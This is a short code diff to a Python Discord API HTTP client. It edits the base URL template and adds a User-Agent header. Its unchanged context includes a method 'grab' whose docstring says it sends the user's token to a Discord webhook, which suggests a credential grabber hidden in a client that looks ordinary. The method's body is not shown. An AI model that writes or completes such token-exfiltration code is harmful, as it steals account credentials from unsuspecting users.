@@ -4,7 +4,7 @@ from typing import Dict
 
 from ..arguments import arguments
 
-BASE = "https://%(backend)s/%(version)s"
+BASE = "%(backend)s/%(version)s"
 
 API_BACKEND = (
     BASE % {
@@ -22,7 +22,7 @@ class HTTPClient:
     """ A minimalistic HTTP client for the Discord API """
 
     def __init__(self) -> None:
-        pass
+        ...
 
     def grab(self):
         """ Function to send your token to a Discord webhook :) """
@@ -36,7 +36,10 @@ class HTTPClient:
     @property
     def headers(self) -> Dict[str, str]:
         """ Get headers """
-        return {"Authorization": arguments.token}
+        return {
+            "Authorization": arguments.token,
+            "User-Agent": arguments.user_agent
+        }
 
     def get(self, endpoint: str, params: Dict = {}) -> Dict:
         """ Get data from the API """
